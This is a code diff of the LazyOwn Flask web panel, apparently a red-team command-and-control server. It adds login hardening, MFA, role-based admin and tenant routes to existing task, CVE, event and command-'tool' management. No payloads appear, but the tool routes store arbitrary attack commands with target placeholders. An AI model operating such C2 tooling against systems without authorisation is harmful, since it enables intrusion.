+    return render_template("task.html", task=task, task_description=task_description)
 
-@app.route('/gettasks', methods=['GET'])
+
+@app.route("/gettasks", methods=["GET"])
+@requires_auth_or_session
 def get_tasks():
     response = decoy()
     if response:
@@ -3822,140 +5536,165 @@ def get_tasks():
     tasks = load_tasks()
     return jsonify(tasks)
 
-@app.route('/tasks', methods=['GET'])
+
+@app.route("/tasks", methods=["GET"])
+@requires_auth_or_session
 def tasks():
     response = decoy()
     if response:
         return response
     tasks = load_tasks()
-    return render_template('tasks.html', tasks=tasks)
+    groups, noise = _group_tasks_for_display(tasks)
+    return render_template("tasks.html", tasks=tasks, task_groups=groups, noise_count=noise)
 
-@app.route('/task/<int:task_id>/edit', methods=['GET', 'POST'])
+
+def _normalize_task_title(title: object) -> str:
+    """Collapse a task title to its dedup key (kept for template compat)."""
+    from modules.c2_surfaces import _normalize_task_title as _norm
+
+    return _norm(title)
+
+
+def _group_tasks_for_display(tasks: list) -> tuple[list, int]:
+    """Group tasks for the /tasks page (delegates to c2_surfaces)."""
+    try:
+        from modules.c2_surfaces import group_tasks_for_display as _group
+
+        return _group(tasks)
+    except Exception:
+        items = [t for t in (tasks or []) if isinstance(t, dict)]
+        return [{"task": t, "count": 1} for t in items], 0
+
+
+@app.route("/task/<int:task_id>/edit", methods=["GET", "POST"])
+@requires_auth_or_session
 def edit_task(task_id):
     response = decoy()
     if response:
         return response
     tasks = load_tasks()
-    task = next((t for t in tasks if t['id'] == task_id), None)
+    task = next((t for t in tasks if t["id"] == task_id), None)
     if not task:
-        flash('Task not found!', 'danger')
-        return redirect(url_for('index'))
+        flash("Task not found!", "danger")
+        return redirect(url_for("index"))
 
-    if request.method == 'POST':
-        title = request.form['title']
-        description = request.form['description']
-        operator = request.form['operator']
-        status = request.form['status']
+    if request.method == "POST":
+        title = request.form["title"]
+        description = request.form["description"]
+        operator = request.form["operator"]
+        status = request.form["status"]
         valid_statuses = ["New", "Refined", "Started", "Review", "Qa", "Done", "Blocked"]
 
         if status not in valid_statuses:
             return "Invalid status selected!", 400
-        task['title'] = title
-        task['description'] = description
-        task['operator'] = operator
-        task['status'] = status
+        task["title"] = title
+        task["description"] = description
+        task["operator"] = operator
+        task["status"] = status
 
         save_tasks(tasks)
-        flash('Task updated successfully!', 'success')
-        return redirect(url_for('task', task_id=task_id))
+        flash("Task updated successfully!", "success")
+        return redirect(url_for("task", task_id=task_id))
 
-    task_description = markdown.markdown(task['description'])
-    return render_template('edit_task.html', task=task, task_description=task_description)
+    task_description = markdown.markdown(task["description"])
+    return render_template("edit_task.html", task=task, task_description=task_description)
 
 
-@app.route('/cves', methods=['GET', 'POST'])
+@app.route("/cves", methods=["GET", "POST"])
+@requires_auth_or_session
 def cves():
     response = decoy()
     cves = load_cves()
     if response:
         return response
-    if request.method == 'POST':
-        title = request.form['title']
-        description = request.form['description']
-        operator = request.form['operator']
-        risk = request.form['risk']
+    if request.method == "POST":
+        title = request.form["title"]
+        description = request.form["description"]
+        operator = request.form["operator"]
+        risk = request.form["risk"]
         valid_statuses = ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFORMATIONAL"]
 
         if risk not in valid_statuses:
             return "Invalid Risk selected!", 400
 
-        new_cve = {
-            'id': len(cves),
-            'title': title,
-            'description': description,
-            'operator': operator,
-            'risk': risk
-        }
+        new_cve = {"id": len(cves), "title": title, "description": description, "operator": operator, "risk": risk}
         cves.append(new_cve)
         save_cves(cves)
-        flash('Task created successfully!', 'success')
-        return redirect(url_for('index'))
+        flash("Task created successfully!", "success")
+        return redirect(url_for("index"))
 
-    return render_template('cves.html', cves=cves)
+    return render_template("cves.html", cves=cves)
 
-@app.route('/cve/<int:cve_id>')
+
+@app.route("/cve/<int:cve_id>")
+@requires_auth_or_session
 def cve(cve_id):
     response = decoy()
     if response:
         return response
     cves = load_cves()
-    cve = next((t for t in cves if t['id'] == cve_id), None)
+    cve = next((t for t in cves if t["id"] == cve_id), None)
     if not cve:
-        flash('CVE not found!', 'danger')
-        return redirect(url_for('index'))
-    cve_description = markdown.markdown(cve['description'])
-    return render_template('cve.html', cve=cve, cve_description=cve_description)
+        flash("CVE not found!", "danger")
+        return redirect(url_for("index"))
+    cve_description = markdown.markdown(cve["description"])
+    return render_template("cve.html", cve=cve, cve_description=cve_description)
 
-@app.route('/cve/<int:cve_id>/edit', methods=['GET', 'POST'])
+
+@app.route("/cve/<int:cve_id>/edit", methods=["GET", "POST"])
+@requires_auth_or_session
 def edit_cve(cve_id):
     response = decoy()
     if response:
         return response
     cves = load_cves()
-    cve = next((t for t in cves if t['id'] == cve_id), None)
+    cve = next((t for t in cves if t["id"] == cve_id), None)
     if not cve:
-        flash('Task not found!', 'danger')
-        return redirect(url_for('index'))
+        flash("Task not found!", "danger")
+        return redirect(url_for("index"))
 
-    if request.method == 'POST':
-        title = request.form['title']
-        description = request.form['description']
-        operator = request.form['operator']
-        status = request.form['status']
+    if request.method == "POST":
+        title = request.form["title"]
+        description = request.form["description"]
+        operator = request.form["operator"]
+        status = request.form["status"]
         valid_statuses = ["New", "Refined", "Started", "Review", "Qa", "Done", "Blocked"]
 
         if status not in valid_statuses:
             return "Invalid status selected!", 400
-        cve['title'] = title
-        cve['description'] = description
-        cve['operator'] = operator
-        cve['status'] = status
+        cve["title"] = title
+        cve["description"] = description
+        cve["operator"] = operator
+        cve["status"] = status
 
         save_cves(cves)
-        flash('Task updated successfully!', 'success')
-        return redirect(url_for('cve', cve_id=cve_id))
+        flash("Task updated successfully!", "success")
+        return redirect(url_for("cve", cve_id=cve_id))
 
-    cve_description = markdown.markdown(cve['description'])
-    return render_template('edit_cve.html', cve=cve, cve_description=cve_description)
+    cve_description = markdown.markdown(cve["description"])
+    return render_template("edit_cve.html", cve=cve, cve_description=cve_description)
 
 
-@app.route('/notes', methods=['GET', 'POST'])
+@app.route("/notes", methods=["GET", "POST"])
+@requires_auth_or_session
 def edit_notes():
     response = decoy()
     if response:
         return response
-    if request.method == 'POST':
-        content = str(request.form['content'])
+    if request.method == "POST":
+        content = str(request.form["content"])
         notes = content
         save_note(notes)
-        flash('Notes updated successfully!', 'success')
-        shell.onecmd('create_session_json')
-        return redirect(url_for('view_note'))
+        flash("Notes updated successfully!", "success")
+        shell.onecmd("create_session_json")
+        return redirect(url_for("view_note"))
 
     notes = load_note()
-    return render_template('edit_note.html', note=notes)
+    return render_template("edit_note.html", note=notes)
 
-@app.route('/getnotes', methods=['GET'])
+
+@app.route("/getnotes", methods=["GET"])
+@requires_auth_or_session
 def get_notes():
     response = decoy()
     if response:
@@ -3963,29 +5702,46 @@ def get_notes():
     notes = load_note()
     return jsonify(notes)
 
-@app.route('/view_note')
+
+@app.route("/view_note")
+@requires_auth_or_session
 def view_note():
     response = decoy()
     if response:
         return response
     note = load_note()
-    return render_template('view_note.html', note=note)
+    return render_template("view_note.html", note=note)
 
-@app.route('/push_notification', methods=['POST'])
+
+@app.route("/push_notification", methods=["POST"])
+@requires_auth
 def push_notification():
-    html_content = request.form.get('html')
+    html_content = request.form.get("html")
     if not html_content:
         return jsonify({"error": "HTML content is required"}), 400
-    notifications = load_notifications()
-    notifications.append({"html": html_content})
+    if len(html_content) > 4096:
+        return jsonify({"error": "HTML content too large"}), 413
+    sanitized = _lazyc2_sanitize_html(html_content)
+    try:
+        notifications = load_notifications()
+    except (OSError, json.JSONDecodeError) as exc:
+        logging.getLogger(__name__).warning("push_notification: failed to load: %s", exc)
+        return jsonify({"error": "Failed to read notification store"}), 500
+    notifications.append({"html": sanitized})
     JSON_FILE_PATH = "sessions/notifications.json"
-    with open(JSON_FILE_PATH, 'w') as f:
-        json.dump(notifications, f, indent=4)
-
+    try:
+        tmp = JSON_FILE_PATH + ".tmp"
+        with open(tmp, "w") as f:
+            json.dump(notifications, f, indent=4)
+        os.replace(tmp, JSON_FILE_PATH)
+    except OSError as exc:
+        logging.getLogger(__name__).warning("push_notification: failed to write: %s", exc)
+        return jsonify({"error": "Failed to persist notification"}), 500
     return jsonify({"message": "Notification saved successfully"}), 200
 
 
-@app.route('/edit_event/<event_name>', methods=['GET', 'POST'])
+@app.route("/edit_event/<event_name>", methods=["GET", "POST"])
+@requires_auth_or_session
 def edit_event(event_name):
     response = decoy()
     if response:
@@ -3997,37 +5753,42 @@ def edit_event(event_name):
     if not event:
         return "Event not found", 404
 
-    if request.method == 'POST':
+    if request.method == "POST":
+        event.update(
+            {
+                "name": request.form["title"],
+                "src_path": request.form["src_path"],
+                "size": int(request.form["size"]),
+                "description": request.form["description"],
+                "outputtype": request.form["outputtype"],
+                "outputtodelete": request.form["outputtodelete"],
+                "prompt": request.form["prompt"],
+                "operator": request.form["operator"],
+                "status": request.form["status"],
+            }
+        )
 
-        event.update({
-            "name": request.form["title"],
-            "src_path": request.form["src_path"],
-            "size": int(request.form["size"]),
-            "description": request.form["description"],
-            "outputtype": request.form["outputtype"],
-            "outputtodelete": request.form["outputtodelete"],
-            "prompt": request.form["prompt"],
-            "operator": request.form["operator"],
-            "status": request.form["status"]
-        })
-
-        with open('event_config.json', 'w') as f:
+        with open("event_config.json", "w") as f:
             json.dump(event_config, f, indent=4)
-        return redirect(url_for('get_event_config_view'))
+        return redirect(url_for("get_event_config_view"))
 
-    return render_template('edit_event.html', event=event)
+    return render_template("edit_event.html", event=event)
 
-@app.route('/event_config', methods=['GET'])
+
+@app.route("/event_config", methods=["GET"])
+@requires_auth_or_session
 def get_event_config():
     event_config = load_event_config()
     return jsonify(event_config)
 
-@app.route('/event_config_view', methods=['GET', 'POST'])
+
+@app.route("/event_config_view", methods=["GET", "POST"])
+@requires_auth_or_session
 def get_event_config_view():
     response = decoy()
     if response:
         return response
-    if request.method == 'POST':
+    if request.method == "POST":
         event = {
             "name": request.form.get("title"),
             "src_path": request.form.get("src_path"),
@@ -4037,28 +5798,32 @@ def get_event_config_view():
             "outputtodelete": request.form.get("outputtodelete"),
             "prompt": request.form["prompt"],
             "operator": request.form.get("operator"),
-            "status": request.form.get("status")
+            "status": request.form.get("status"),
         }
 
         event_config = load_event_config()
-
 
         if "events" not in event_config:
             event_config["events"] = []
 
         event_config["events"].append(event)
 
-        with open('event_config.json', 'w') as f:
+        with open("event_config.json", "w") as f:
             json.dump(event_config, f, indent=4)
 
-        return redirect(url_for('get_event_config_view'))
+        return redirect(url_for("get_event_config_view"))
 
     event_config = load_event_config()
-    return render_template('event_config_view.html', event_config=event_config)
+    return render_template("event_config_view.html", event_config=event_config)
 
-@app.route('/aicmd', methods=['GET'])
+
+@app.route("/aicmd", methods=["GET"])
+@login_required
 def aicmd_view():
-    cmd = request.args.get('arg')
+    response = decoy()
+    if response:
+        return response
+    cmd = request.args.get("arg")
 
     INVALID = "Unknown command"
 
@@ -4076,21 +5841,21 @@ def aicmd_view():
     else:
         return jsonify({"error": "Arg not allowed"}), 400
 
-@app.route('/events', methods=['GET'])
+
+@app.route("/events", methods=["GET"])
+@requires_auth_or_session
 def get_events():
     client_ip = request.remote_addr
     if current_user.is_authenticated:
-        if config.enable_c2_debug == True:
+        if config.enable_c2_debug:
             logger.info(f"Autenticated. Wellcome {client_ip}")
     else:
-        if config.enable_c2_debug == True:
+        if config.enable_c2_debug:
             logger.info("Unautenticated.")
-        return redirect(url_for('login'))
+        return redirect(url_for("login"))
     global events
     event_config = load_event_config()
-    response = {
-        "events": events
-    }
+    response = {"events": events}
     global BASE_DIR
 
     for event in event_config["events"]:
@@ -4101,10 +5866,7 @@ def get_events():
         src_path = event["src_path"].format(BASE_DIR=BASE_DIR, rhost=rhost)
         size = event["size"]
 
-        matching_events = [
-            e for e in events
-            if e["src_path"] == src_path and e["size"] > size
-        ]
+        matching_events = [e for e in events if e["src_path"] == src_path and e["size"] > size]
 
         if matching_events:
             response[event_key]["exist"] = True
@@ -4112,75 +5874,76 @@ def get_events():
     return jsonify(response)
 
 
-@app.route('/tools', methods=['GET'])
+@app.route("/tools", methods=["GET"])
+@requires_auth_or_session
 def list_tools():
     response = decoy()
     if response:
         return response
-    tools = [f for f in os.listdir(TOOLS_DIR) if f.endswith('.tool')]
-    return render_template('list_tools.html', tools=tools)
+    tools = [f for f in os.listdir(TOOLS_DIR) if f.endswith(".tool")]
+    return render_template("list_tools.html", tools=tools)
 
 
-@app.route('/tools/create', methods=['GET', 'POST'])
+@app.route("/tools/create", methods=["GET", "POST"])
+@requires_auth_or_session
 def create_tool():
     response = decoy()
     config = load_payload()
     if response:
         return response
-    if request.method == 'POST':
-        toolname = request.form['toolname']
-        command = request.form['command']
-        trigger = request.form.getlist('trigger')
-        active = request.form.get('active') == 'true'
+    if request.method == "POST":
+        toolname = request.form["toolname"]
+        command = request.form["command"]
+        trigger = request.form.getlist("trigger")
+        active = request.form.get("active") == "true"
         securetoolname = secure_filename(toolname)
         for key, value in config.items():
-            command = command.replace(f'{{{str(key)}}}', str(value))
+            command = command.replace(f"{{{str(key)}}}", str(value))
 
-        tool_data = {
-            "toolname": securetoolname,
-            "command": command,
-            "trigger": trigger,
-            "active": active
-        }
+        tool_data = {"toolname": securetoolname, "command": command, "trigger": trigger, "active": active}
 
-        tool_path = os.path.join(TOOLS_DIR, f'{securetoolname}.tool')
-        with open(tool_path, 'w') as file:
+        tool_path = os.path.join(TOOLS_DIR, f"{securetoolname}.tool")
+        with open(tool_path, "w") as file:
             json.dump(tool_data, file, indent=4)
 
-        return redirect(url_for('list_tools'))
+        return redirect(url_for("list_tools"))
 
-    return render_template('create_tool.html', config=config, current_user=current_user)
+    return render_template("create_tool.html", config=config, current_user=current_user)
 
-@app.route('/tools/<toolname>', methods=['GET'])
+
+@app.route("/tools/<toolname>", methods=["GET"])
+@requires_auth_or_session
 def view_tool(toolname):
     response = decoy()
     if response:
         return response
     tools = []
     for filename in os.listdir(TOOLS_DIR):
-        if filename.endswith('.tool'):
+        if filename.endswith(".tool"):
             tool_path_safe = os.path.join(TOOLS_DIR, filename)
-            with open(tool_path_safe, 'r') as file:
+            with open(tool_path_safe, "r") as file:
                 tool_data = json.load(file)
-                tool_data['filename'] = filename
+                tool_data["filename"] = filename
                 tools.append(tool_data)
 
     valid_tool = None
     for tool in tools:
-        if toolname == tool['filename'].replace('.tool', ''):
+        if toolname == tool["filename"].replace(".tool", ""):
             valid_tool = tool
             break
 
     if not valid_tool:
         abort(404, description="Herramienta no encontrada o no válida")
 
-    tool_path = os.path.join(TOOLS_DIR, tool['filename'])
+    tool_path = os.path.join(TOOLS_DIR, tool["filename"])
 
-    with open(tool_path, 'r') as file:
+    with open(tool_path, "r") as file:
         tool_data = json.load(file)
-    return render_template('view_tool.html', tool=tool_data)
+    return render_template("view_tool.html", tool=tool_data)
 
-@app.route('/tools/<toolname>/update', methods=['GET', 'POST'])
+
+@app.route("/tools/<toolname>/update", methods=["GET", "POST"])
+@requires_auth_or_session
 def update_tool(toolname):
     response = decoy()
     config = load_payload()
@@ -4189,49 +5952,46 @@ def update_tool(toolname):
 
     tools = []
     for filename in os.listdir(TOOLS_DIR):
-        if filename.endswith('.tool'):
+        if filename.endswith(".tool"):
             tool_path_safe = os.path.join(TOOLS_DIR, filename)
-            with open(tool_path_safe, 'r') as file:
+            with open(tool_path_safe, "r") as file:
                 tool_data = json.load(file)
-                tool_data['filename'] = filename
+                tool_data["filename"] = filename
                 tools.append(tool_data)
 
     valid_tool = None
     for tool in tools:
-        if toolname == tool['filename'].replace('.tool', ''):
+        if toolname == tool["filename"].replace(".tool", ""):
             valid_tool = tool
             break
 
     if not valid_tool:
         abort(404, description="Herramienta no encontrada o no válida")
 
-    tool_path = os.path.join(TOOLS_DIR, tool['filename'])
-    if request.method == 'POST':
-        command = request.form['command']
-        trigger = request.form.getlist('trigger')
-        active = request.form.get('active') == 'true'
+    tool_path = os.path.join(TOOLS_DIR, tool["filename"])
+    if request.method == "POST":
+        command = request.form["command"]
+        trigger = request.form.getlist("trigger")
+        active = request.form.get("active") == "true"
 
         for key, value in config.items():
-            command = command.replace(f'{{{str(key)}}}', str(value))
+            command = command.replace(f"{{{str(key)}}}", str(value))
 
-        tool_data = {
-            "toolname": toolname,
-            "command": command,
-            "trigger": trigger,
-            "active": active
-        }
+        tool_data = {"toolname": toolname, "command": command, "trigger": trigger, "active": active}
 
-        with open(tool_path, 'w') as file:
+        with open(tool_path, "w") as file:
             json.dump(tool_data, file, indent=4)
 
-        return redirect(url_for('list_tools'))
+        return redirect(url_for("list_tools"))
 
-    with open(tool_path, 'r') as file:
+    with open(tool_path, "r") as file:
         tool_data = json.load(file)
 
-    return render_template('edit_tool.html', tool=tool_data, config=config)
+    return render_template("edit_tool.html", tool=tool_data, config=config)
 
-@app.route('/tools/<toolname>/delete', methods=['POST'])
+
+@app.route("/tools/<toolname>/delete", methods=["POST"])
+@requires_auth_or_session
 def delete_tool(toolname):
     response = decoy()
     if response:
@@ -4239,118 +5999,529 @@ def delete_tool(toolname):
 
     tools = []
     for filename in os.listdir(TOOLS_DIR):
-        if filename.endswith('.tool'):
+        if filename.endswith(".tool"):
             tool_path_safe = os.path.join(TOOLS_DIR, filename)
-            with open(tool_path_safe, 'r') as file:
+            with open(tool_path_safe, "r") as file:
                 tool_data = json.load(file)
-                tool_data['filename'] = filename
+                tool_data["filename"] = filename
                 tools.append(tool_data)
 
     valid_tool = None
     for tool in tools:
-        if toolname == tool['filename'].replace('.tool', ''):
+        if toolname == tool["filename"].replace(".tool", ""):
             valid_tool = tool
             break
 
     if not valid_tool:
         abort(404, description="Herramienta no encontrada o no válida")
 
-
-    tool_path = os.path.join(TOOLS_DIR, valid_tool['filename'])
+    tool_path = os.path.join(TOOLS_DIR, valid_tool["filename"])
 
     try:
         os.remove(tool_path)
-    except OSError as e:
-        return f"Error al eliminar el archivo:", 500
+    except OSError:
+        return "Error al eliminar el archivo:", 500
 
-    return redirect(url_for('list_tools'))
+    return redirect(url_for("list_tools"))
 
-@app.route('/register', methods=['GET', 'POST'])
-@limiter.limit(config.c2_login_limit)
+
+@app.route("/register", methods=["GET", "POST"])
+@limiter.limit(getattr(config, "c2_register_limit", "5 per minute"))
 def register():
     response = decoy()
     if response:
         return response
-    if request.method == 'POST':
-        username = request.form.get('username', '').strip()
-        password = request.form.get('password', '').strip()
+    if not bool(getattr(config, "c2_open_registration", True)):
+        flash("Registration is disabled on this server.", "error")
+        return redirect(url_for("login"))
+    if request.method == "POST":
+        username = request.form.get("username", "").strip()
+        password = request.form.get("password", "").strip()
 
         if not username or not password:
-            flash('Uername and password is mandatory.', 'error')
-            return redirect(url_for('register'))
+            flash("Username and password are mandatory.", "error")
+            return redirect(url_for("register"))
 
-        if len(password) < 8:
-            flash('Password at least 8 chars.', 'error')
-            return redirect(url_for('register'))
+        if len(password) < 12:
+            flash("Password must be at least 12 chars.", "error")
+            return redirect(url_for("register"))
+
+        if _RBAC_AVAILABLE:
+            store = get_rbac_store()
+            if store.find_by_username(username):
+                flash("Username already exists.", "error")
+                return redirect(url_for("register"))
+            role = ROLE_DEFAULT
+            store.create_user(
+                username=username,
+                password_hash=generate_password_hash(password),
+                role=role,
+            )
+            flash("Registration successful. Please login.", "success")
+            return redirect(url_for("login"))
 
         users = load_users()
+        if any(user["username"] == username for user in users):
+            flash("Username already exists.", "error")
+            return redirect(url_for("register"))
 
-        if any(user['username'] == username for user in users):
-            flash('Username Exist.', 'error')
-            return redirect(url_for('register'))
         new_user = {
-            'id': len(users) + 1,
-            'username': username,
-            'password_hash': generate_password_hash(password),
-            'elo': 0
+            "id": len(users) + 1,
+            "username": username,
+            "password_hash": generate_password_hash(password),
+            "elo": 0,
+            "role": ROLE_DEFAULT,
+            "mfa_enabled": False,
+            "mfa_secret": "",
+            "recovery_codes": [],
+            "tenant_id": "default",
         }
         users.append(new_user)
         save_users(users)
+        flash("Registration successful. Please login.", "success")
+        return redirect(url_for("login"))
 
-        flash('Success, Please Login.', 'success')
-        return redirect(url_for('login'))
+    return render_template("register.html")
 
-    return render_template('register.html')
 
-@app.route('/login', methods=['GET', 'POST'])
-@limiter.limit(config.c2_login_limit)
+@app.route("/login", methods=["GET", "POST"])
+@limiter.limit(getattr(config, "c2_login_limit", "10 per minute") or "10 per minute")
 def login():
     response = decoy()
     if response:
         return response
-    if request.method == 'POST':
-        username = request.form.get('username', '').strip()
-        password = request.form.get('password', '').strip()
+    if request.method == "POST":
+        username = request.form.get("username", "").strip()
+        password = request.form.get("password", "").strip()
+
+        if _RBAC_AVAILABLE:
+            store = get_rbac_store()
+            rbac_user = store.find_by_username(username)
+            if rbac_user and check_password_hash(rbac_user.password_hash, password):
+                user = User(rbac_user.to_dict())
+                if rbac_user.mfa_enabled:
+                    logout_user()
+                    session.clear()
+                    session["mfa_pending_user_id"] = user.id
+                    session["mfa_user_id"] = user.id
+                    session["mfa_verified"] = False
+                    return redirect(url_for("mfa_verify"))
+                login_user(user)
+                session.pop("mfa_pending_user_id", None)
+                session.pop("mfa_user_id", None)
+                session["mfa_verified"] = True
+                if rbac_user.must_change_password:
+                    flash("You must change your one-time password before continuing.", "warning")
+                    return redirect(url_for("change_password"))
+                flash("Welcome to LazyOwn.", "success")
+                return redirect(url_for("profile"))
+            else:
+                flash("Invalid login credentials.", "error")
+                return render_template("login.html")
 
         users = load_users()
-        user_data = next((user for user in users if user['username'] == username), None)
+        user_data = next((user for user in users if user["username"] == username), None)
 
-        if user_data and check_password_hash(user_data['password_hash'], password):
+        if user_data and check_password_hash(user_data["password_hash"], password):
             user = User(user_data)
             login_user(user)
-            flash('Wellcome to LazyOwn .', 'success')
-            return redirect(url_for('profile'))
+            if user_data.get("must_change_password"):
+                flash("You must change your one-time password before continuing.", "warning")
+                return redirect(url_for("change_password"))
+            flash("Welcome to LazyOwn.", "success")
+            return redirect(url_for("profile"))
         else:
-            flash('Error Login incorrect .', 'error')
+            flash("Invalid login credentials.", "error")
 
-    return render_template('login.html')
+    return render_template("login.html")
 
-@app.route('/profile')
+
+@app.route("/mfa/setup", methods=["GET", "POST"])
+@login_required
+def mfa_setup():
+    if not _RBAC_AVAILABLE:
+        flash("RBAC module not available.", "error")
+        return redirect(url_for("profile"))
+    response = decoy()
+    if response:
+        return response
+    store = get_rbac_store()
+    rbac_user = _get_rbac_user_obj(current_user)
+    if not rbac_user:
+        flash("User not found.", "error")
+        return redirect(url_for("login"))
+
+    if request.method == "POST":
+        action = request.form.get("action", "")
+        if action == "enable":
+            updated = store.enable_mfa(rbac_user.id)
+            if updated:
+                session["mfa_setup_secret"] = updated.mfa_secret
+                session["mfa_setup_username"] = updated.username
+                flash("MFA enabled. Scan the QR code with your authenticator app.", "success")
+                return redirect(url_for("mfa_setup"))
+            flash("Failed to enable MFA.", "error")
+        elif action == "disable":
+            token = request.form.get("mfa_code", "").strip()
+            if rbac_user and rbac_user.verify_totp(token):
+                store.disable_mfa(rbac_user.id)
+                session.pop("mfa_setup_secret", None)
+                flash("MFA disabled.", "success")
+                return redirect(url_for("profile"))
+            else:
+                flash("Invalid TOTP code. MFA not disabled.", "error")
+        elif action == "disable_recovery":
+            code = request.form.get("mfa_code", "").strip()
+            if rbac_user and rbac_user.verify_recovery_code(code):
+                store.consume_recovery_code(rbac_user.id, code)
+                store.disable_mfa(rbac_user.id)
+                session.pop("mfa_setup_secret", None)
+                flash("MFA disabled via recovery code. That recovery code has been consumed.", "success")
+                return redirect(url_for("profile"))
+            else:
+                flash("Invalid recovery code.", "error")
+        elif action == "verify_setup":
+            token = request.form.get("mfa_code", "").strip()
+            secret = session.get("mfa_setup_secret", "")
+            if secret and pyotp.TOTP(secret).verify(token, valid_window=1):
+                session.pop("mfa_setup_secret", None)
+                flash("MFA setup verified successfully!", "success")
+                return redirect(url_for("profile"))
+            else:
+                flash("Invalid TOTP code. Please try again.", "error")
+
+    secret = session.get("mfa_setup_secret", "") or rbac_user.mfa_secret
+    recovery_codes = rbac_user.recovery_codes if rbac_user.recovery_codes else []
+
+    qr_url = ""
+    if secret:
+        try:
+            qr_url = generate_mfa_qr_url(secret, rbac_user.username)
+        except Exception:
+            pass
+
+    return render_template(
+        "mfa_setup.html",
+        user=current_user,
+        mfa_enabled=rbac_user.mfa_enabled,
+        mfa_secret=secret,
+        qr_url=qr_url,
+        recovery_codes=recovery_codes,
+    )
+
+
+@app.route("/mfa/qr/<username>")
+@login_required
+def mfa_qr(username):
+    """Serve a locally-generated QR code SVG for MFA setup.
+
+    Zero external API calls. The QR code is generated server-side using
+    pure Python (no external dependencies beyond pyotp). Works offline.
+    """
+    try:
+        from modules.lazy_rbac import RBACStore, generate_qr_svg
+
+        store = get_rbac_store() if _RBAC_AVAILABLE else RBACStore(USER_DATA_PATH)
+        user = store.find_by_username(username)
+        if not user or not user.mfa_secret:
+            return Response("User or MFA secret not found", status=404)
+        uri = pyotp.totp.TOTP(user.mfa_secret).provisioning_uri(name=user.username, issuer_name=MFA_ISSUER)
+        svg = generate_qr_svg(uri)
+        return Response(svg, mimetype="image/svg+xml")
+    except Exception as e:
+        logger.error("QR generation failed: %s", e)
+        return Response("QR generation failed", status=500)
+
+
+@app.route("/mfa/verify", methods=["GET", "POST"])
+def mfa_verify():
+    if not _RBAC_AVAILABLE:
+        return redirect(url_for("login"))
+    response = decoy()
+    if response:
+        return response
+
+    user_id = session.get("mfa_pending_user_id", session.get("mfa_user_id"))
+    if not user_id:
+        return redirect(url_for("login"))
+
+    store = get_rbac_store()
+    rbac_user = store.find_by_id(int(user_id))
+    if not rbac_user:
+        session.pop("mfa_pending_user_id", None)
+        session.pop("mfa_user_id", None)
+        flash("Session expired. Please login again.", "error")
+        return redirect(url_for("login"))
+
+    def _complete_mfa_login():
+        logout_user()
+        login_user(User(rbac_user.to_dict()))
+        session["mfa_verified"] = True
+        session.pop("mfa_pending_user_id", None)
+        session.pop("mfa_user_id", None)
+        return session.pop("mfa_pending_route", url_for("profile"))
+
+    if request.method == "POST":
+        code = request.form.get("mfa_code", "").strip()
+        use_recovery = request.form.get("use_recovery") == "1"
+
+        if use_recovery:
+            if rbac_user.verify_recovery_code(code):
+                store.consume_recovery_code(rbac_user.id, code)
+                pending = _complete_mfa_login()
+                flash("Authenticated via recovery code. Generate new codes in MFA settings.", "success")
+                return redirect(pending)
+            else:
+                flash("Invalid recovery code.", "error")
+        else:
+            if rbac_user.verify_totp(code):
+                pending = _complete_mfa_login()
+                flash("MFA verified successfully.", "success")
+                return redirect(pending)
+            else:
+                flash("Invalid TOTP code.", "error")
+
+    return render_template("mfa_verify.html", has_recovery=bool(rbac_user.recovery_codes))
+
+
+@app.route("/admin/users", methods=["GET"])
+@login_required
+@require_role(Role.ADMIN.value)
+def admin_users():
+    if not _RBAC_AVAILABLE:
+        flash("RBAC module not available.", "error")
+        return redirect(url_for("profile"))
+    response = decoy()
+    if response:
+        return response
+    store = get_rbac_store()
+    users_list = store.load_all()
+    return render_template("admin_users.html", users=users_list, roles=Role, current_user=current_user)
+
+
+@app.route("/admin/users/<int:user_id>/role", methods=["POST"])
+@login_required
+@require_role(Role.ADMIN.value)
+def admin_set_role(user_id):
+    if not _RBAC_AVAILABLE:
+        return jsonify({"error": "RBAC not available"}), 500
+    new_role = request.form.get("role", "").strip()
+    if new_role not in Role.valid_roles():
+        flash("Invalid role.", "error")
+        return redirect(url_for("admin_users"))
+
+    store = get_rbac_store()
+    admin_user = _get_rbac_user_obj(current_user)
+    if not admin_user or not admin_user.can_manage_role(new_role):
+        flash("You cannot assign this role.", "error")
+        return redirect(url_for("admin_users"))
+
+    store.update_role(user_id, new_role)
+    flash(f"User role updated to {new_role}.", "success")
+    return redirect(url_for("admin_users"))
+
+
+@app.route("/admin/users/<int:user_id>/mfa/reset", methods=["POST"])
+@login_required
+@require_role(Role.ADMIN.value)
+def admin_reset_mfa(user_id):
+    if not _RBAC_AVAILABLE:
+        return jsonify({"error": "RBAC not available"}), 500
+    store = get_rbac_store()
+    store.disable_mfa(user_id)
+    flash("MFA reset for user.", "success")
+    return redirect(url_for("admin_users"))
+
+
+@app.route("/admin/users/<int:user_id>/delete", methods=["POST"])
+@login_required
+@require_role(Role.ADMIN.value)
+def admin_delete_user(user_id):
+    if not _RBAC_AVAILABLE:
+        return jsonify({"error": "RBAC not available"}), 500
+
+    admin_user = _get_rbac_user_obj(current_user)
+    if admin_user and admin_user.id == user_id:
+        flash("Cannot delete your own account.", "error")
+        return redirect(url_for("admin_users"))
+
+    store = get_rbac_store()
+    store.delete_user(user_id)
+    flash("User deleted.", "success")
+    return redirect(url_for("admin_users"))
+
+
+@app.route("/admin/tenants", methods=["GET"])
+@login_required
+@require_role(Role.ADMIN.value)
+def admin_tenants():
+    if not _RBAC_AVAILABLE:
+        flash("RBAC module not available.", "error")
+        return redirect(url_for("profile"))
+    response = decoy()
+    if response:
+        return response
+    tm = get_tenant_manager()
+    tenants = tm.list_tenants()
+    active = tm.get_active()
+    return render_template(
+        "admin_tenants.html",
+        tenants=tenants,
+        active=active,
+        current_user=current_user,
+    )
+
+
+@app.route("/admin/tenants/create", methods=["POST"])
+@login_required
+@require_role(Role.ADMIN.value)
+def admin_create_tenant():
+    if not _RBAC_AVAILABLE:
+        return jsonify({"error": "RBAC not available"}), 500
+    name = request.form.get("name", "").strip()
+    if not name:
+        flash("Tenant name is required.", "error")
+        return redirect(url_for("admin_tenants"))
+    tm = get_tenant_manager()
+    try:
+        tc = tm.create_tenant(name)
+        flash(f'Tenant "{tc.name}" created.', "success")
+    except ValueError as e:
+        logger.warning("tenant create failed: %s", type(e).__name__)
+        flash("Tenant operation failed.", "error")
+    return redirect(url_for("admin_tenants"))
+
+
+@app.route("/admin/tenants/<tenant_id>/switch", methods=["POST"])
+@login_required
+@require_role(Role.ADMIN.value)
+def admin_switch_tenant(tenant_id):
+    if not _RBAC_AVAILABLE:
